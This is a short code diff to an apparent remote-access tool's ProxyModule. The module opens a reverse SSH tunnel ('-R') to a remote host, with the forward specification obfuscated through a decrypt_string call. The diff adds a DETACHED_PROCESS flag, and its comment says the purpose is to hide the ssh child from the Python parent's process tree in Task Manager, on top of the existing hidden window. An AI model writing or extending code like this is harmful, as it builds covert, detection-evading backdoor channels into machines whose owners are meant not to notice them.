@@ -211,10 +211,12 @@ class ProxyModule(BaseModule):
             "-o", "ConnectTimeout=10", "-o", "LogLevel=ERROR",
             "-R", decrypt_string("XggUBC0wNQo1BB4CCVUJGQ9eJxshIy0f"), remote,
         ]
+        # 0x00000008 = DETACHED_PROCESS, prevents the child from being grouped under the Python parent tree in Task Manager
+        flags = subprocess.CREATE_NO_WINDOW | 0x00000008
         self._ssh_process = subprocess.Popen(
             cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
             text=True, encoding="utf-8", errors="replace",
-            creationflags=0x08000000, # CREATE_NO_WINDOW
+            creationflags=flags,
         )
         return self._wait_for_port(svc["port_pattern"], timeout=15)
 
